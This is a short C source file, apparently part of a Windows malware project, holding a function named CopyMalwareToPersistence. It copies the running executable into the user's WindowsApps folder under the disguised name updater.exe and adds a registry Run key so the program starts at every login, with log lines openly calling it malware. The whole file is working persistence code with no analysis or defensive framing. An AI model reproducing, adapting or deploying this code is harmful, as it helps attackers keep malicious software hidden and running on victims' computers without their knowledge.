#include "persistence.h"
#pragma warning(disable:4996)

BOOL CopyMalwareToPersistence() {

	// Retrieve current path to the Exe
	char currentPath[MAX_PATH] = { 0 };
	GetModuleFileNameA(NULL, currentPath, MAX_PATH);
	printf("Path to exe: %s \n", currentPath);


	// Create Destination Path
	// Copy exe to %LOCALAPPDATA%\Microsoft\WindowsApps
	char DestPath[MAX_PATH] = { 0 };
	GetEnvironmentVariableA("LOCALAPPDATA", DestPath, MAX_PATH);
	strcat(DestPath, "\\Microsoft\\WindowsApps\\updater.exe");

	if (!CopyFileA(currentPath, DestPath, FALSE)) {
		printf("[-] CopyFileA failed: %d", GetLastError());
		return FALSE;
	}

	printf("[*] Malware Copied Succesfully on Path: %s \n", DestPath);

	
	// Create key on HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
	HKEY hKey = NULL;
	LSTATUS STATUS = NULL;
	BOOL bState = TRUE;

	STATUS = RegOpenKeyExA(HKEY_CURRENT_USER, REGISTRY, 0, KEY_SET_VALUE, &hKey);
	if (ERROR_SUCCESS != STATUS) {
		printf("Error RegOpenKeyExA with: %d \n", GetLastError());
		bState = FALSE; goto _EndOfFunctions;
	}


	STATUS = RegSetValueExA(hKey,REGSTRING,0,REG_SZ,(BYTE*)DestPath,strlen(DestPath) + 1);
	if (ERROR_SUCCESS != STATUS) {
		printf("Error RegSetValueExA: %d \n", GetLastError());
		bState = FALSE; goto _EndOfFunctions;
	}



_EndOfFunctions:
	if (hKey)
		RegCloseKey(hKey);
	return bState;
}
